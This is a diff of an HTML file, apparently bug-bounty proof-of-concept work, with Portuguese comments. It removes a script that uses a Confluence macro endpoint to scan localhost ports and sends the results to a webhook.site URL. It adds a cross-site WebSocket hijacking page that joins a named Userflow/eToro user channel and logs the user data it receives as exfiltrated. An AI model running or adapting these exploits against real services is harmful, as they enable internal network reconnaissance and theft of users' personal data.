@@ -1,24 +1,79 @@
-<script>
-var ports = [22, 80, 443, 8080, 3000, 5000, 6379, 27017, 5432, 9200];
-var results = [];
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSWSH Exploit PoC - Userflow/eToro</title>
+    <style>
+        body { font-family: monospace; background-color: #1a1a1a; color: #00ff00; padding: 20px; }
+        #console { background: #000; border: 1px solid #333; padding: 15px; height: 400px; overflow-y: scroll; }
+        .success { color: #55ff55; }
+        .error { color: #ff5555; }
+        .data { color: #ffff55; border-bottom: 1px solid #333; margin-bottom: 5px; padding-bottom: 5px; }
+    </style>
+</head>
+<body>
+    <h1>Exfiltrando Dados do WebSocket (CSWSH)</h1>
+    <p>Status: <span id="status">Desconectado</span></p>
+    <div id="console"></div>
 
-ports.forEach(function(port) {
-  var start = performance.now();
-  
-  // Tentar conectar via redirect
-  fetch('https://confluence-dialogs.weweave.net/macro-remote?pageId=1212597&url=http://127.0.0.1:' + port + '/&outputType=display')
-    .then(function() {
-      var time = performance.now() - start;
-      results.push({port: port, time: time, status: 'open/filtered'});
-    })
-    .catch(function() {
-      var time = performance.now() - start;
-      results.push({port: port, time: time, status: 'closed/error'});
-    });
-});
+    <script>
+        const endpoint = "wss://e.userflow.com/end-users/ct_lu2g2jsjmncxfcerlwcpl3yyca/socket/websocket?vsn=2.0.0";
+        const consoleDiv = document.getElementById("console");
+        const statusSpan = document.getElementById("status");
 
-// Enviar resultados após 10 segundos
-setTimeout(function() {
-  new Image().src = 'https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?scan=' + encodeURIComponent(JSON.stringify(results));
-}, 10000);
-</script>
+        function log(msg, type = "") {
+            const p = document.createElement("p");
+            p.className = type;
+            p.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            consoleDiv.appendChild(p);
+            consoleDiv.scrollTop = consoleDiv.scrollHeight;
+        }
+
+        try {
+            log("Iniciando conexão maliciosa para " + endpoint);
+            const ws = new WebSocket(endpoint);
+
+            ws.onopen = () => {
+                statusSpan.textContent = "Conectado (Handshake Bypass!)";
+                statusSpan.className = "success";
+                log("Conexão WebSocket estabelecida com sucesso.", "success");
+
+                // Payload do Framework Phoenix para dar 'Join' no canal do usuário
+                // O formato é: [join_ref, ref, topic, event, payload]
+                const joinPayload = JSON.stringify([
+                    "1", 
+                    "1", 
+                    "end_user:ct_lu2g2jsjmncxfcerlwcpl3yyca", 
+                    "phx_join", 
+                    {}
+                ]);
+
+                log("Enviando comando phx_join...");
+                ws.send(joinPayload);
+            };
+
+            ws.onmessage = (event) => {
+                // Aqui é onde os dados sensíveis (e-mail, nome, fluxos) aparecem
+                log("DADOS EXFILTRADOS: " + event.data, "data");
+                
+                // Enviar batida de coração (heartbeat) para manter a conexão viva
+                if (event.data.includes("phx_reply")) {
+                    ws.send(JSON.stringify([null, "2", "phoenix", "heartbeat", {}]));
+                }
+            };
+
+            ws.onerror = (err) => {
+                log("Erro na conexão. Verifique se o ID expirou ou se há proteção de IP.", "error");
+            };
+
+            ws.onclose = () => {
+                log("Conexão encerrada pelo servidor.", "error");
+                statusSpan.textContent = "Encerrado";
+            };
+
+        } catch (e) {
+            log("Erro: " + e.message, "error");
+        }
+    </script>
+</body>
+</html>
